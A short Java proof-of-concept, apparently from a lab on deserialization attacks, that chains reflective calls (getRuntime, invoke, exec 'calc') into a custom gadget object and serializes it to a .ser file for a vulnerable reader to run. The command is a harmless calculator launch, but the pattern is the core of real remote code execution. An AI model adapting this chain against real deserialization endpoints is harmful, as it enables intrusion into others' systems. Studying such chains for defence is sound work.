package unserialize_pop;

import java.io.FileOutputStream;
import java.io.ObjectOutputStream;

public class POC {

	public static void main(String[] args) throws Throwable {
		// TODO Auto-generated method stub
		POPChainInterestingOperations[] popChainInterestingOperationsArray = new POPChainInterestingOperations[]{
                new POPChainInterestingOperations(
                        "getMethod",
                        new Class[] {String.class, Class[].class},
                        new Object[] {"getRuntime", new Class[0]}
                ),
                new POPChainInterestingOperations(
                        "invoke",
                        new Class[] {Object.class, Object[].class},
                        new Object[] {null, new Object[0]}
                ),
                new POPChainInterestingOperations(
                        "exec",
                        new Class[] {String.class},
                        new Object[] {new String("calc")}
                )
		};

		POPChainTransfer popChainTransfer = new POPChainTransfer(popChainInterestingOperationsArray, Runtime.class);
		
		ObjectOutputStream o = new ObjectOutputStream(new FileOutputStream("D:\\foo.ser"));
        o.writeObject(popChainTransfer);
	}

}
